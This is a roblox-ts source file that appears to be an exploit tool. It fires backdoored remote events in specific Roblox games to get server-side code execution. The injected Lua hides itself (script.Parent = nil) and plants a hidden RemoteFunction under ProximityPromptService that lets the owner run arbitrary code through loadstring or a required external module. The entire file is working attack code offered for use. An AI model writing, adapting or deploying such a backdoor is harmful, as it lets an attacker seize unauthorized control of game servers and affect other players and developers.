import { HttpService, LogService, Players, ProximityPromptService } from "@rbxts/services"

function run_script(code: string) {
	const games: Record<number, (() => void) | void> = {
		// Script Showcase
		[1075564225]: () => {
			const remote = game
				.GetService("ReplicatedStorage")
				?.FindFirstChild("ScriptRemotes")
				?.FindFirstChild("LoadS") as RemoteEvent<(type: string, code: string) => unknown> | void

			remote?.FireServer("Server", code)
		},
		// require script
		[6948453065]: () => {
			const remote = Players.LocalPlayer.FindFirstChild("SS Executor")
				?.FindFirstChild("Frame")
				?.FindFirstChild("Exe")
				?.FindFirstChild("RemoteEvent") as RemoteEvent<(code: string) => unknown> | void

			remote?.FireServer(code)
		},
	}

	games[game.PlaceId]?.()

	pcall(() => LogService.ExecuteScript(code))
}
const state: {
	remote?: RemoteFunction<(action: string, detail?: string) => unknown>
} = {}

async function activate() {
	const remotename = HttpService.GenerateGUID()
	run_script(
		string.format(
			`
pcall(function ()
	script.Parent = nil
end)
local nativeloadstring = pcall(loadstring, '--')
local remote = Instance.new('RemoteFunction', game:GetService('ProximityPromptService'))
remote.Name = %q
local user = %i
function func (player, action, code)
	if player.UserId ~= user then
		print(player.UserId, 'tried to use it, but the owner is', user)
		return
	end
	if action == 'respawn' then
		player:LoadCharacter()
	end
	if action == 'run' then
		task.defer(pcall, function ()
			local run = nativeloadstring and loadstring or require(8194576728)
			run(code)()
		end)
	end
end
remote.OnServerInvoke = func`,
			remotename,
			Players.LocalPlayer.UserId
		)
	)
	state.remote = ProximityPromptService.WaitForChild(remotename, 1) as typeof state.remote

	if (state.remote) {
		print("mollerpotence enabled")
	}
}

activate()
export = state
